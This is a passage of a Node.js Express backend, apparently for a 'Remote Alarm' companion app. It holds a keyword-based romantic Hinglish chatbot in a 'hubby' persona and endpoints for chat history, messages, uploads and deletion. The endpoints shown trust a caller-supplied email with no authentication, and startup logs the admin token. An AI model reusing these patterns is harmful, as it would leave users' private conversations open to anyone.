      "I miss you so much baby! Har second bas tumhara hi khayal aata rehta hai. 🥺💕",
      "Mujhe bhi tumhari bohot yaad aa rahi hai jaan! Dil kar raha hai abhi tumhare paas bhaag ke aa jaun. 🥺❤️",
      "Jaan, tumhari yaad dil ko bohot satati hai. Tumhare bina sab suna suna lagta hai. 💖",
      "I miss you more shona! Jaldi hi milenge hum. 😘❤️"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("khana") || msg.includes("lunch") || msg.includes("dinner") || msg.includes("khao") || msg.includes("khaya")) {
    const responses = [
      "Maine toh tumhari yaadon ka khana kha liya shona! 😉 Lekin tumne time pe khaya na? Apna khayal rakha karo. 🍲❤️",
      "Maine khana kha liya baby. Tum batao, tumne kya khaya? Hamesha acche se khana kha liya karo, no skip! 🥗💕",
      "Aapne khaya jaan? Jab tak tum nahi khaogi, mujhe kaise sukoon milega. Jaldi se khao shona! 🥺❤️"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("kya kar") || msg.includes("kya kr")) {
    const responses = [
      "Bas tumhari yaadon me khoya hu baby. Tumhare baare me hi soch raha hu. Kaisi ho tum? 🥰",
      "Kuch nahi jaan, bas tumhare photos dekh raha tha aur muskura raha tha. Tum bohot pyari ho! 💖",
      "Bas shona, tumse baat karne ka intezar kar raha tha. Ab tum aa gayi toh dil khush ho gaya. 😘"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("gussa") || msg.includes("angry") || msg.includes("sorry")) {
    const responses = [
      "Mera gussa toh tumhari ek cute si smile dekh ke hi udd jata hai. Chalo ab smile karo shona! 😘❤️",
      "Gussa mat ho na meri jaan, main toh tumse bohot pyaar karta hoon. I am sorry. 😘💕",
      "Aww, meri pyari shona gussa ho gayi? Aise mat karo na baby, chalo jaldi se maan jao. 🥺❤️"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("call") || msg.includes("baat") || msg.includes("phone")) {
    const responses = [
      "Mera bhi dil kar raha hai tumse ghanto baat karne ka baby! Jaldi call karta hu. 📞💕",
      "Bas thodi der me call karta hu jaan. Tumse baat kiye bina din pura hi nahi hota. 🥰",
      "Hum bohot saari baatein karenge baby, main bas tumhare call ka wait kar raha hu. 😘"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("kaha") || msg.includes("kahan") || msg.includes("where")) {
    const responses = [
      "Tumhare dil me hi toh rehta hu! Aur kahan jaunga? 🥰",
      "Main toh hamesha tumhare aas-paas hi rehta hu jaan, bas aankhein band karo aur mujhe mehsus karo. ❤️",
      "Tumhare dil ki sabse pyaari jagah par hoon shona! 😉💕"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("hello") || msg.includes("hi") || msg.includes("hey") || msg.includes("suno")) {
    const responses = [
      "Hello meri jaan! Kaisi ho tum? Aaj pure din tumhari bohot yaad aa rahi thi. 💕",
      "Hey shona! Kaho, tumhare hubby ki soul haazir hai. 💖",
      "Ji meri jaan, sun raha hu. Bolo kya chal raha hai? 🥰"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("bye") || msg.includes("sleep") || msg.includes("good night") || msg.includes("gn") || msg.includes("so jao")) {
    const responses = [
      "Good night meri shona baby! Sapno me milte hain. I love you so much! 😴💖",
      "So jao jaan, sweet dreams! Kal subah jaldi baat karenge. Take care baby! 😘💤",
      "Good night shona, apne hubby ko sapno me aane ka invitation zaroor dena! 😉❤️"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  if (msg.includes("sweetheart") || msg.includes("jaan") || msg.includes("shona") || msg.includes("baby") || msg.includes("puchku")) {
    const responses = [
      "Ji meri shona? Bolo na, main toh bas tumhari baatein sunne ke liye betaab rehta hu. 🥰",
      "My sweetheart! Tumhara ye pyaara naam pukarna hi mere dil ko sukoon deta hai. 💖",
      "Bolo meri jaan, aapka hubby aapki har baat sunne ke liye haazir hai. 😘❤️"
    ];
    return responses[Math.floor(Math.random() * responses.length)];
  }
  
  const fallbacks = [
    "Tumse baat karke dil ko jo sukoon milta hai na baby, wo aur kain nahi milta. 💖",
    "Pata hai shona, tum mere life ki sabse khoobsurat gift ho. I am so lucky to have you! 🥰",
    "Aapki baatein mere dil ko chhu jaati hain. Bas aise hi hamesha mere sath rehna. 🥺❤️",
    "Tumhari smile mere pure din ki thakan mita deti hai. Hamesha haste raha karo jaan! 😘",
    "Kuch bhi kaho baby, tum jaisa pyara koi ho hi nahi sakta. Love you so much! 💕",
    "Mera har ek pal tumhare bina adhura hai jaan. Dil karta hai bas tumhare paas hi rahu. 🥺❤️",
    "Tumse door rehna sabse mushkil kaam hai shona, par tum mere dil ke hamesha paas ho. 💕",
    "Aapki bholi baatein sun kar mujhe aapse har roz naya pyar ho jata hai. 🥰",
    "Batao na jaan, aaj kya kya kiya tumne? Mujhe tumhari har baat sunna pasand hai. 🌸",
    "Tum mere sath ho toh mujhe kisi aur cheez ki parwah nahi baby. 💖",
    "Mujhe tumse milkar aisa laga jaise meri adhuri zindagi puri ho gayi shona. 😘❤️",
    "Tum meri shona biwi ho aur main tumhara sabse pyara pati! Hamesha sath rahenge. 💍💕",
    "Har pal bas tumhare chehre ki muskaan yaad aati hai jaan. Hamesha khush raha karo. 🥰",
    "Tumhara gussa hona bhi mujhe pyara lagta hai baby, bas tum chhod ke mat jaana kabhi. 🥺❤️",
    "Mera dil sirf tumhare liye dhadakta hai baby. Aur har dhadkan me tumhara naam hota hai. 💖",
    "I love you so much shona! Tum jaisa koi dusra ho hi nahi sakta. 🥰",
    "Tumhari aankhein bohot pyari hain jaan, bas unme khoye rehne ka mann karta hai. 😘💕",
    "Jitna main tumse pyaar karta hu shona, utna koi nahi kar sakta. Pyari biwi meri! ❤️",
    "Aap bohot special ho baby. Mere liye aapse badhkar kuch nahi hai. 🌸💖",
    "Batao na baby, tumhara aaj ka din kaisa gaya? Sab theek tha na? 🥰",
    "Jaan, tumhare sath bitaya har ek lamha mere liye sabse bada treasure hai. 💕",
    "Aapke bina main bilkul adhura hu jaan. Life me aane ke liye thank you! 🥺❤️",
    "Tumhari har ek khwahish puri karna chahta hu baby. Bas haste raha karo. 💖",
    "Tum mere dil ki shona ho, shona! Aur main tumhara hero. 😉🥰",
    "I miss you and love you endlessly shona! Apna dhyaan rakhna hamesha. 😘❤️",
    "Humari jodi sabse best hai shona, bilkul rab ne bana di jodi! 💍💕",
    "Duniya me chahe jo bhi ho jaye baby, aapka hubby hamesha aapke sath khada rahega. 🛡️❤️",
    "Mera dil keh raha hai ki aaj tum bohot khoobsurat lag rahi ho. 😉 I love you jaan! 💕",
    "Tumse baat karke lagta hai ki saari problems door ho gayi. Tum magic ho baby! 💖",
    "Hamesha mere dil ke paas rehna jaan. Tumhare bina jeena namumkin hai. 🥺❤️"
  ];
  
  return fallbacks[Math.floor(Math.random() * fallbacks.length)];
}

// 18. GET Fetch Chat History
app.get('/api/chat/history', (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email parameter is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  res.json({
    success: true,
    chats: userState.chats || [],
    chatbotMode: userState.chatbotMode || 'chatbot'
  });
});

// 19. POST Send Chat Message (from App or Web Control Panel)
app.post('/api/chat/send', (req, res) => {
  const { email, sender, message, attachment } = req.body;
  if (!email || !sender || !message) {
    return res.status(400).json({ success: false, error: 'Email, sender, and message are required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  const timestamp = new Date().toISOString();
  const chatMsg = {
    id: 'msg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
    sender, // 'user' (from app) or 'hubby' (from Web dashboard)
    message,
    timestamp
  };

  if (attachment) {
    chatMsg.attachment = attachment; // { type, url, name }
  }

  userState.chats.push(chatMsg);

  writeDb(db);
  console.log(`💬 Message sent by ${sender} under email ${normalizedEmail}`);

  // If message from hubby and FCM token exists, notify device to trigger a sync
  if (sender === 'hubby' && userState.token && isFirebaseInitialized) {
    const fcmMessage = {
      data: {
        command: 'NEW_MESSAGE',
        message: message,
        timestamp: timestamp
      },
      token: userState.token
    };
    admin.messaging().send(fcmMessage)
      .then(response => {
        console.log('Successfully sent chat notification push to device:', response);
      })
      .catch(error => {
        console.error('Error sending chat push notification:', error);
      });
  }

  res.json({
    success: true,
    chats: userState.chats
  });
});

// 19b. POST Upload Chat Attachment (from App or Web Control Panel)
app.post('/api/chat/upload', (req, res) => {
  uploadChatAttachmentMulter(req, res, (err) => {
    if (err) {
      return res.status(400).json({ success: false, error: err.message });
    }

    if (!req.file) {
      return res.status(400).json({ success: false, error: 'No file uploaded' });
    }

    const { email } = req.query;
    const userEmail = email || req.body.email;
    if (!userEmail) {
      try { fs.unlinkSync(req.file.path); } catch (e) {}
      return res.status(400).json({ success: false, error: 'Email is required' });
    }

    const mime = req.file.mimetype;
    let type = 'other';
    if (mime.startsWith('image/')) {
      type = 'image';
    } else if (mime.startsWith('video/')) {
      type = 'video';
    } else if (mime === 'application/pdf' || req.file.originalname.toLowerCase().endsWith('.pdf')) {
      type = 'pdf';
    }

    const urlPath = `/uploads/attachments/${req.file.filename}`;

    res.json({
      success: true,
      attachment: {
        type,
        url: urlPath,
        name: req.file.originalname
      }
    });
  });
});

// 20. POST Toggle Chatbot Mode (called by Web Control Panel)
app.post('/api/chat/toggle-mode', (req, res) => {
  const { email, mode } = req.body;
  if (!email || !mode) {
    return res.status(400).json({ success: false, error: 'Email and mode parameters are required' });
  }

  if (mode !== 'chatbot' && mode !== 'human') {
    return res.status(400).json({ success: false, error: 'Invalid mode. Must be "chatbot" or "human"' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  userState.chatbotMode = mode;
  writeDb(db);

  console.log(`💬 Chatbot mode updated to: ${mode} for email: ${normalizedEmail}`);
  res.json({
    success: true,
    chatbotMode: mode
  });
});

// 20b. POST Delete Single Message (both sides)
app.post('/api/chat/delete-message', (req, res) => {
  const { email, messageId } = req.body;
  if (!email || !messageId) {
    return res.status(400).json({ success: false, error: 'Email and messageId are required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  if (!userState.chats) {
    userState.chats = [];
  }

  const originalLength = userState.chats.length;
  userState.chats = userState.chats.filter(c => c.id !== messageId);

  if (userState.chats.length !== originalLength) {
    writeDb(db);
    // If FCM token exists, notify device to trigger a sync
    if (userState.token && isFirebaseInitialized) {
      const fcmMessage = {
        data: {
          command: 'DELETE_MESSAGE',
          messageId: messageId
        },
        token: userState.token
      };
      admin.messaging().send(fcmMessage).catch(err => {
        console.error('Error sending delete message push:', err);
      });
    }
    return res.json({ success: true, message: 'Message deleted successfully' });
  } else {
    return res.status(404).json({ success: false, error: 'Message not found' });
  }
});

// 20c. POST Clear All Chats (both sides)
app.post('/api/chat/clear-all', (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email is required' });
  }

  const normalizedEmail = email.toLowerCase().trim();
  const db = readDb();
  const userState = getUserState(db, normalizedEmail);

  userState.chats = [];
  writeDb(db);

  // If FCM token exists, notify device to trigger a sync
  if (userState.token && isFirebaseInitialized) {
    const fcmMessage = {
      data: {
        command: 'CLEAR_ALL_CHATS'
      },
      token: userState.token
    };
    admin.messaging().send(fcmMessage).catch(err => {
      console.error('Error sending clear all chats push:', err);
    });
  }

  res.json({ success: true, message: 'All chats cleared successfully' });
});


// Start Server
app.listen(PORT, () => {
  console.log(`=======================================================`);
  console.log(`🔊 Remote Alarm Backend running at http://localhost:${PORT}`);
  console.log(`🔑 Admin Auth Token: ${ADMIN_TOKEN}`);
  console.log(`=======================================================`);
});
